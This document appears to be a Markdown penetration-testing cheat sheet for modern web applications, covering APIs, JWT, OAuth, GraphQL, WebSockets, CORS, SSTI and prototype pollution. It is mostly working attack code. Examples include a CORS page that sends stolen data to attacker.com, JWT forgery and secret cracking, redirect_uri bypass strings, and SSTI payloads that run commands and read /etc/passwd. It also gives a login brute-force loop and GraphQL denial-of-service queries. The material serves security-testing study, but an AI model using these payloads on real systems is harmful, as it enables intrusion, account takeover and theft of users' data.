# Modern Web Application Security

Advanced web security testing for modern applications including APIs, SPAs, and cloud-native apps.

## Table of Contents

- [Modern Web Application Security](#modern-web-application-security)
  - [Table of Contents](#table-of-contents)
  - [API Security](#api-security)
    - [REST API Testing](#rest-api-testing)
  - [JWT Vulnerabilities](#jwt-vulnerabilities)
    - [JWT Analysis](#jwt-analysis)
    - [Common JWT Attacks](#common-jwt-attacks)
    - [JWT Testing Checklist](#jwt-testing-checklist)
  - [OAuth \& OIDC Attacks](#oauth--oidc-attacks)
    - [OAuth 2.0 Flow Testing](#oauth-20-flow-testing)
  - [GraphQL Security](#graphql-security)
    - [GraphQL Reconnaissance](#graphql-reconnaissance)
    - [Introspection Query](#introspection-query)
    - [GraphQL Attacks](#graphql-attacks)
  - [WebSocket Security](#websocket-security)
    - [WebSocket Testing](#websocket-testing)
  - [CORS Misconfigurations](#cors-misconfigurations)
    - [Testing CORS](#testing-cors)
  - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
    - [Detection](#detection)
    - [Exploitation](#exploitation)
  - [Prototype Pollution](#prototype-pollution)
    - [Detection](#detection-1)
  - [Tools](#tools)
  - [Resources](#resources)

## API Security

### REST API Testing

**Reconnaissance:**

```bash
# Discover API endpoints
# Check common paths
for path in /api /api/v1 /api/v2 /rest /graphql /swagger /api-docs; do
    curl -s "https://target.com$path" -o /dev/null -w "%{http_code} $path\n"
done

# Find Swagger/OpenAPI documentation
cat subdomains-live.txt | httpx -path /swagger.json -mc 200 -silent
cat subdomains-live.txt | httpx -path /swagger-ui.html -mc 200 -silent
cat subdomains-live.txt | httpx -path /api-docs -mc 200 -silent
cat subdomains-live.txt | httpx -path /openapi.json -mc 200 -silent

# Download and analyze OpenAPI spec
curl https://target.com/swagger.json | jq . > swagger.json

# Generate API requests from OpenAPI spec
python3 << EOF
import json
spec = json.load(open('swagger.json'))
for path, methods in spec['paths'].items():
    for method in methods:
        print(f"{method.upper()} {path}")
EOF
```

**Common API Vulnerabilities:**

```bash
# Mass Assignment / Parameter Pollution
# Test with extra parameters
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass","is_admin":true}'

# IDOR in API
# Try changing IDs
curl https://target.com/api/users/1  # Your ID
curl https://target.com/api/users/2  # Someone else's ID

# API Rate Limiting Bypass
# Missing or weak rate limits
for i in {1..1000}; do
    curl https://target.com/api/login -d "user=admin&pass=$i" &
done

# Excessive Data Exposure
# API returns more data than UI shows
curl https://target.com/api/users/me | jq .

# API Version Testing
# Old versions might have vulnerabilities
curl https://target.com/api/v1/users  # Old
curl https://target.com/api/v2/users  # New

# HTTP Method Tampering
curl -X GET https://target.com/api/delete/1   # Should be DELETE
curl -X POST https://target.com/api/users/1 -d "_method=DELETE"

# JWT in API
# Check for weak secrets, algorithm confusion
# See JWT section below
```

**Automated API Testing:**

```bash
# Using Nuclei
nuclei -l api-endpoints.txt -t nuclei-templates/http/vulnerabilities/

# Using Arjun (parameter discovery)
arjun -u https://target.com/api/endpoint

# Using ffuf for API fuzzing
ffuf -w api-wordlist.txt -u https://target.com/api/FUZZ -mc 200,401,403

# Mass testing with custom script
cat api-endpoints.txt | while read endpoint; do
    # Test authentication
    curl -s "$endpoint" -o /dev/null -w "%{http_code} $endpoint\n" | grep -E "200|401"

    # Test methods
    for method in GET POST PUT DELETE PATCH; do
        curl -s -X $method "$endpoint" -o /dev/null -w "$method %{http_code}\n"
    done
done
```

## JWT Vulnerabilities

### JWT Analysis

```bash
# Decode JWT (without verification)
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | cut -d. -f1,2 | tr '.' '\n' | while read part; do
    echo "$part" | base64 -d 2>/dev/null | jq .
done

# Or use jwt_tool
jwt_tool eyJ0eXAiOiJKV1Qi...

# Online: https://jwt.io/
```

### Common JWT Attacks

**1. Algorithm Confusion (alg: none):**

```python
#!/usr/bin/env python3
import base64
import json

header = {"typ": "JWT", "alg": "none"}
payload = {"user": "admin", "role": "admin"}

# Encode
h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# JWT with no signature
jwt = f"{h}.{p}."
print(jwt)
```

**2. Algorithm Confusion (RS256 to HS256):**

```bash
# If server uses public key as HMAC secret
# Get public key
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > public.pem

# Generate token with HS256 using public key as secret
jwt_tool original_token -S hs256 -k public.pem
```

**3. Weak Secret Brute Force:**

```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Using jwt_tool
jwt_tool token -C -d /usr/share/wordlists/rockyou.txt

# Using john
john jwt.txt --wordlist=rockyou.txt
```

**4. Key Confusion:**

```bash
# Try using public key as HMAC secret
jwt_tool token -X k -pk public.pem

# Change algorithm
jwt_tool token -X a

# Tamper payload
jwt_tool token -T
```

**5. Kid (Key ID) Injection:**

```python
# Path traversal in kid parameter
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "../../../../../../dev/null"
}
# Server might use file content as key (null bytes)
```

**6. JKU (JWK Set URL) Injection:**

```python
# Point to attacker-controlled JWK
header = {
    "typ": "JWT",
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json"
}
```

### JWT Testing Checklist

```bash
# 1. Decode and analyze
jwt_tool token

# 2. Test algorithm confusion
jwt_tool token -X a

# 3. Test key confusion
jwt_tool token -X k -pk public.pem

# 4. Brute force weak secret
jwt_tool token -C -d rockyou.txt

# 5. Modify claims
jwt_tool token -T

# 6. Check token expiration
# Look for exp claim

# 7. Test token reuse
# Can old tokens still be used?

# 8. Test different endpoints
# Same token for different APIs?
```

## OAuth & OIDC Attacks

### OAuth 2.0 Flow Testing

**Authorization Code Flow:**

```bash
# 1. Capture authorization request
https://provider.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://app.com/callback&
  scope=openid profile email&
  state=random_state

# Test Cases:
# - Redirect URI manipulation
# - State parameter missing (CSRF)
# - Code reuse
# - Code leakage via Referer
```

**Common OAuth Vulnerabilities:**

```bash
# 1. Open Redirect via redirect_uri
https://provider.com/authorize?
  redirect_uri=https://attacker.com

# 2. Missing state parameter (CSRF)
# Attacker can force victim to authenticate as attacker

# 3. Redirect URI validation bypass
redirect_uri=https://app.com@attacker.com
redirect_uri=https://app.com.attacker.com
redirect_uri=https://app.com%2F@attacker.com
redirect_uri=https://app.com%0A@attacker.com
redirect_uri=https://app.com/../attacker.com

# 4. Code/Token reuse
# Try using authorization code multiple times

# 5. Token leakage
# Check for tokens in:
# - Referer header
# - Browser history
# - Logs

# 6. Scope escalation
# Request broader scopes than granted
```

**OIDC Specific:**

```bash
# ID Token validation
# Check if server validates:
# - Signature
# - iss (issuer)
# - aud (audience)
# - exp (expiration)
# - nonce (replay protection)

# Test with modified ID token
```

## GraphQL Security

### GraphQL Reconnaissance

```bash
# Discover GraphQL endpoint
cat subdomains-live.txt | httpx -path /graphql -mc 200 -silent
cat subdomains-live.txt | httpx -path /graphiql -mc 200 -silent
cat subdomains-live.txt | httpx -path /api/graphql -mc 200 -silent

# Test if GraphQL is enabled
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__typename}"}'
```

### Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Using GraphQL Tools:**

```bash
# GraphQL Voyager - Visualize schema
# https://graphql-kit.com/graphql-voyager/

# InQL Scanner - Burp extension
# Automatically discover queries

# GraphQL IDE
# GraphiQL, GraphQL Playground, Altair
```

### GraphQL Attacks

**1. Introspection Abuse:**

```bash
# Extract full schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection-query.json | jq . > schema.json
```

**2. IDOR in GraphQL:**

```graphql
query {
  user(id: 1) {
    # Try different IDs
    email
    password
    ssn
  }
}
```

**3. Batching Attacks:**

```graphql
# Send multiple queries in one request
[
  {"query": "query { user(id: 1) { email }}"},
  {"query": "query { user(id: 2) { email }}"},
  {"query": "query { user(id: 3) { email }}"}
]
```

**4. Recursive Query (DoS):**

```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            # ... deeply nested
          }
        }
      }
    }
  }
}
```

**5. Field Duplication:**

```graphql
query {
  user(id: 1) {
    email
    email
    email
    # Repeat 1000 times
  }
}
```

**6. Alias Abuse:**

```graphql
query {
  user1: user(id: 1) {
    email
  }
  user2: user(id: 2) {
    email
  }
  user3: user(id: 3) {
    email
  }
  # ... many aliases
}
```

**7. Mutation Testing:**

```graphql
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}
```

## WebSocket Security

### WebSocket Testing

```javascript
// Connect to WebSocket
const ws = new WebSocket("wss://target.com/socket");

ws.onopen = () => {
  console.log("Connected");

  // Send message
  ws.send(
    JSON.stringify({
      action: "subscribe",
      channel: "private",
    })
  );
};

ws.onmessage = (event) => {
  console.log("Received:", event.data);
};

ws.onerror = (error) => {
  console.error("Error:", error);
};
```

**Common WebSocket Vulnerabilities:**

```bash
# 1. Missing Origin Validation
# Connect from different origin

# 2. No Authentication
# WebSocket accessible without auth

# 3. Message Injection
# Inject malicious JSON/data

# 4. CSRF on WebSocket Handshake
# Force victim to establish connection

# 5. Information Disclosure
# Sensitive data in messages
```

**Testing with wscat:**

```bash
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/socket

# Send message
> {"action": "getMessages", "userId": 1}

# Test different user IDs
> {"action": "getMessages", "userId": 2}

# Test with headers
wscat -c wss://target.com/socket -H "Authorization: Bearer token"
```

## CORS Misconfigurations

### Testing CORS

```bash
# Test for reflected origin
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -X OPTIONS https://target.com/api/data \
  -I

# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  # Vulnerable!
# Access-Control-Allow-Credentials: true  # Critical if present
```

**Common CORS Misconfigurations:**

```bash
# 1. Reflected Origin
# Server reflects any origin

# 2. Wildcard with Credentials
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# (Not allowed together, but might be bypassed)

# 3. Null Origin
curl -H "Origin: null" https://target.com/api/data

# 4. Subdomain Wildcard
# evil.target.com might be trusted

# 5. Trust localhost
curl -H "Origin: http://localhost" https://target.com/api/data
```

**Exploitation:**

```html
<!-- steal-data.html -->
<script>
  fetch("https://target.com/api/sensitive", {
    credentials: "include",
  })
    .then((r) => r.text())
    .then((data) => {
      // Send to attacker
      fetch("https://attacker.com/steal?data=" + btoa(data));
    });
</script>
```

**Automated Testing:**

```bash
# Using Corsy
python3 corsy.py -u https://target.com/api/endpoint

# Test list of URLs
cat api-endpoints.txt | while read url; do
    curl -H "Origin: https://evil.com" -I "$url" | grep -i "access-control"
done
```

## Server-Side Template Injection (SSTI)

### Detection

```bash
# Test payloads
{{7*7}}      # 49 if vulnerable (Jinja2, Twig)
${7*7}       # 49 if vulnerable (FreeMarker, Velocity)
<%= 7*7 %>   # 49 if vulnerable (ERB)
${{7*7}}     # 49 if vulnerable (Spring)

# Automated detection
cat urls-with-params.txt | qsreplace "{{7*7}}" | while read url; do
    response=$(curl -s "$url")
    echo "$response" | grep -q "49" && echo "[SSTI] $url"
done
```

### Exploitation

**Jinja2 (Python):**

```python
# Read file
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read()}}

# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP):**

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**FreeMarker (Java):**

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Prototype Pollution

### Detection

```javascript
// Test payload
{"__proto__": {"polluted": "yes"}}

// Check if Object.prototype is polluted
console.log({}. polluted);  // "yes" if vulnerable
```

**Exploitation:**

```javascript
// Pollute prototype
fetch("/api/update", {
  method: "POST",
  body: JSON.stringify({
    __proto__: {
      isAdmin: true,
      role: "admin",
    },
  }),
});

// Now all objects inherit these properties
let user = {};
console.log(user.isAdmin); // true
```

**Testing:**

```bash
# Using ppmap
ppmap -u https://target.com --json

# Manual testing
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": true}}'
```

## Tools

```bash
# API Testing
postman, burp suite, arjun, ffuf

# JWT
jwt_tool, hashcat, john

# GraphQL
graphql-voyager, inql, graphql-playground

# WebSocket
wscat, burp suite websocket plugin

# CORS
corsy, burp suite

# SSTI
tplmap, burp suite

# General
nuclei, httpx, curl, jq
```

## Resources

- **OWASP API Security Top 10** - https://owasp.org/www-project-api-security/
- **JWT.io** - https://jwt.io/
- **GraphQL Security** - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- **PortSwigger Web Security Academy** - https://portswigger.net/web-security
